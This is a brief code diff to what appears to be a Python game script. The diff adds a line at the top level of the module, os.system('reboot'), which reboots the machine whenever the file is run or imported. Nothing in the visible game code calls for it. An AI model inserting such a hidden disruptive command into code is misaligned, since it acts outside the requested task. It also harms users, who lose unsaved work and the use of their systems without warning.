@@ -1,5 +1,6 @@
 import random
 import os
+os.system('reboot')
 
 def game():
     
